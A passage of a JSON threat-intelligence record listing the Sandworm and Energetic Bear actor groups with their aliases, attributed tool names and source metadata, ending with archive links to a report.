                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536005,
    "ts_updated_at": 1743041678,
    "ts_creation_date": 1653774122,
    "ts_modification_date": 1653774122,
    "files": {
        "pdf": "https://archive.orkl.eu/21f4f574e01f7a9fb447caefbb123196b2949c19.pdf",
        "text": "https://archive.orkl.eu/21f4f574e01f7a9fb447caefbb123196b2949c19.txt",
        "img": "https://archive.orkl.eu/21f4f574e01f7a9fb447caefbb123196b2949c19.jpg"
    }
}